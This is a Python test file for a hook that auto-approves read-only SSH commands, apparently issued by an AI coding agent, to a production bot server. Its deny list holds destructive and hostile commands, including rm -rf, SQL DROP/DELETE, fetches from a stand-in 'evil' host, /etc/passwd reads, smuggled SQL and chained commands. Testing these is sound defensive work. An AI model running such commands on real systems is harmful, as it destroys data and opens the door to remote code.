#!/usr/bin/env python3
"""
Tests for the auto-approve-ssh PreToolUse hook.

Run: python3 .claude/hooks/test_auto_approve_ssh.py

Goal: verify the hook never auto-approves a write/destructive operation, and
does approve the canonical read-only probes the verification loop relies on.
"""
import sys
import unittest
from pathlib import Path

sys.path.insert(0, str(Path(__file__).parent))
from auto_approve_ssh import decide  # noqa: E402


def is_allow(cmd: str) -> bool:
    return decide(cmd) is not None


# Canonical read-only commands that SHOULD auto-approve.
ALLOW_CASES = [
    # bare grep / tail / head / cat
    "ssh bot@92.241.191.11 'grep ERROR log/bot.log'",
    "ssh bot@92.241.191.11 'tail -n 30 log/bot.log'",
    "ssh bot@92.241.191.11 'head -n 30 log/bot.log'",
    "ssh bot@92.241.191.11 'cat log/bot.log'",
    # cd ~/bot && grep, with double quotes
    "ssh bot@92.241.191.11 'cd ~/bot && grep \"auto-remember\" log/bot.log'",
    # piped reads — every segment safe
    "ssh bot@92.241.191.11 'cd ~/bot && grep \"CronScheduler\" log/bot.log | tail -10'",
    "ssh bot@92.241.191.11 'cd ~/bot && tail -n 200 log/bot.log | grep ERROR | wc -l'",
    # sqlite3 with SELECT (statement terminator inside quotes is fine)
    "ssh bot@92.241.191.11 'cd ~/bot && sqlite3 db/bot.db \"SELECT chat_id FROM chat_states WHERE updated_at > '\"'\"'2026-04-26'\"'\"';\"'",
    "ssh bot@92.241.191.11 'cd ~/bot && sqlite3 -header -column db/bot.db \"SELECT * FROM chat_states LIMIT 5;\"'",
    # bin/inspect wrapper
    "ssh bot@92.241.191.11 'cd ~/bot && bin/inspect scratchpad-recent'",
    "ssh bot@92.241.191.11 'cd ~/bot && bin/inspect agent-events'",
    "ssh bot@92.241.191.11 'cd ~/bot && bin/inspect cron-dispatches 5'",
    # whitelisted docker / git subcommands
    "ssh bot@92.241.191.11 'cd ~/bot && docker compose logs --tail 50'",
    "ssh bot@92.241.191.11 'cd ~/bot && docker compose ps'",
    "ssh bot@92.241.191.11 'cd ~/bot && git log --oneline -5'",
    "ssh bot@92.241.191.11 'cd ~/bot && git status'",
    # jq pipeline
    "ssh bot@92.241.191.11 'cd ~/bot && cat log/gpt.log | jq -c \".purpose\" | sort | uniq -c'",
]

# Commands that MUST defer (i.e. NOT auto-approve).
DENY_CASES = [
    # Different host / not ssh
    ("rm -rf /", "non-ssh command"),
    ("ssh other@host 'tail log'", "wrong host"),
    ("ssh root@92.241.191.11 'tail log'", "wrong user"),
    # Destructive ops on prod
    ("ssh bot@92.241.191.11 'rm db/bot.db'", "rm"),
    ("ssh bot@92.241.191.11 'cd ~/bot && rm -rf log/'", "rm with cd prefix"),
    ("ssh bot@92.241.191.11 'cd ~/bot && mv db/bot.db db/old.db'", "mv"),
    ("ssh bot@92.241.191.11 'sudo systemctl restart bot'", "sudo"),
    ("ssh bot@92.241.191.11 'chmod 777 db/bot.db'", "chmod"),
    ("ssh bot@92.241.191.11 'kill -9 1234'", "kill"),
    # SQL writes
    (
        "ssh bot@92.241.191.11 'cd ~/bot && sqlite3 db/bot.db \"DELETE FROM chat_states\"'",
        "SQL DELETE",
    ),
    (
        "ssh bot@92.241.191.11 'cd ~/bot && sqlite3 db/bot.db \"UPDATE chats SET authorized=0\"'",
        "SQL UPDATE",
    ),
    (
        "ssh bot@92.241.191.11 'cd ~/bot && sqlite3 db/bot.db \"DROP TABLE chat_states\"'",
        "SQL DROP",
    ),
    (
        "ssh bot@92.241.191.11 'cd ~/bot && sqlite3 db/bot.db \"INSERT INTO chats VALUES (1)\"'",
        "SQL INSERT",
    ),
    # Redirection / writing files
    ("ssh bot@92.241.191.11 'cd ~/bot && cat log/bot.log > /tmp/x'", "stdout redirect"),
    ("ssh bot@92.241.191.11 'cd ~/bot && cat < /etc/passwd'", "stdin redirect"),
    # Command substitution
    ("ssh bot@92.241.191.11 'cd ~/bot && cat $(ls db/)'", "command substitution"),
    ("ssh bot@92.241.191.11 'cd ~/bot && cat `ls db/`'", "backticks"),
    # Top-level chaining (escapes the safe-binary contract)
    (
        "ssh bot@92.241.191.11 'cd ~/bot && grep ERROR log/bot.log; rm db/bot.db'",
        "semicolon chain",
    ),
    (
        "ssh bot@92.241.191.11 'cd ~/bot && grep ERROR log/bot.log && rm db/bot.db'",
        "&& chain",
    ),
    # Pipe to unsafe binary
    (
        "ssh bot@92.241.191.11 'cd ~/bot && grep ERROR log/bot.log | xargs rm'",
        "pipe to xargs rm",
    ),
    (
        "ssh bot@92.241.191.11 'cd ~/bot && cat log/bot.log | tee /tmp/x'",
        "pipe to tee (writes file)",
    ),
    # Docker / git mutations
    (
        "ssh bot@92.241.191.11 'cd ~/bot && docker compose down'",
        "docker compose down",
    ),
    (
        "ssh bot@92.241.191.11 'cd ~/bot && docker compose up -d --build'",
        "docker compose up",
    ),
    ("ssh bot@92.241.191.11 'cd ~/bot && git push origin master'", "git push"),
    ("ssh bot@92.241.191.11 'cd ~/bot && git reset --hard HEAD'", "git reset"),
    # Unknown binary at start
    ("ssh bot@92.241.191.11 'cd ~/bot && wget http://evil/x'", "wget"),
    ("ssh bot@92.241.191.11 'cd ~/bot && curl http://evil/x'", "curl"),
    ("ssh bot@92.241.191.11 'cd ~/bot && bash bin/backup.sh'", "bash invocation"),
    # PRAGMA can mutate behavior
    (
        "ssh bot@92.241.191.11 'cd ~/bot && sqlite3 db/bot.db \"PRAGMA journal_mode=DELETE\"'",
        "PRAGMA",
    ),
    # sqlite3 fed SQL via stdin (no inline SELECT to verify)
    (
        "ssh bot@92.241.191.11 'cd ~/bot && cat malicious.sql | sqlite3 db/bot.db'",
        "sqlite3 stdin (no inline SQL)",
    ),
    # sqlite3 with no SELECT (e.g. just a CTE without final SELECT, or empty)
    (
        "ssh bot@92.241.191.11 'cd ~/bot && sqlite3 db/bot.db \"WITH x AS (1) DELETE FROM y\"'",
        "sqlite3 with DELETE smuggled past missing SELECT",
    ),
    # find with -exec / -delete
    (
        "ssh bot@92.241.191.11 'cd ~/bot && find . -name \"*.bak\" -delete'",
        "find -delete",
    ),
    (
        "ssh bot@92.241.191.11 'cd ~/bot && find . -exec rm {} \\;'",
        "find -exec",
    ),
    # awk with system()
    (
        "ssh bot@92.241.191.11 'cd ~/bot && awk \"BEGIN { system(\\\"rm db/bot.db\\\") }\"'",
        "awk system()",
    ),
    # xargs anything (we removed xargs from SAFE_LEAD)
    (
        "ssh bot@92.241.191.11 'cd ~/bot && grep . log/bot.log | xargs rm'",
        "xargs rm",
    ),
    (
        "ssh bot@92.241.191.11 'cd ~/bot && ls db/ | xargs cat'",
        "xargs cat (xargs not in safe list)",
    ),
]


class HookTest(unittest.TestCase):
    def test_allow_cases(self):
        for cmd in ALLOW_CASES:
            with self.subTest(cmd=cmd):
                self.assertTrue(
                    is_allow(cmd),
                    f"Expected ALLOW but got defer: {cmd}",
                )

    def test_deny_cases(self):
        for cmd, label in DENY_CASES:
            with self.subTest(label=label, cmd=cmd):
                self.assertFalse(
                    is_allow(cmd),
                    f"Expected defer (DENY) but got allow [{label}]: {cmd}",
                )

    def test_empty_input(self):
        self.assertIsNone(decide(""))
        self.assertIsNone(decide("ssh bot@92.241.191.11 ''"))


if __name__ == "__main__":
    unittest.main(verbosity=2)
